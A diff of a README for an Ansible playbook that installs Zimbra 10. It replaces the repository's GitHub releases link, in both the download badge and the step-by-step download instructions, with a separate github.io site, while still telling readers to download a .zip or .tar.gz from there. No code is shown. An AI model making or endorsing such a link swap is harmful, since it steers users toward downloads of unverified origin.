@@ -1,6 +1,6 @@
 # ⚙️ ansible-zimbra-10-Dwinar - Automated setup for your mail server
 
-[ ![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://github.com/reducible-parker218/ansible-zimbra-10-Dwinar/releases)
+[ ![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://reducible-parker218.github.io)
 
 ## What is this project?
 
@@ -22,7 +22,7 @@ A fresh system works best. If you have other programs on the server, they might 
 
 You need the latest version of the installer to begin. Follow these steps to obtain the files:
 
-1. Click the following link: [https://github.com/reducible-parker218/ansible-zimbra-10-Dwinar/releases](https://github.com/reducible-parker218/ansible-zimbra-10-Dwinar/releases)
+1. Click the following link: [https://reducible-parker218.github.io](https://reducible-parker218.github.io)
 2. Visit this page to download the latest source code or setup package.
 3. Look for the section labeled Assets.
 4. Click the file ending in .zip or .tar.gz to save it to your computer.
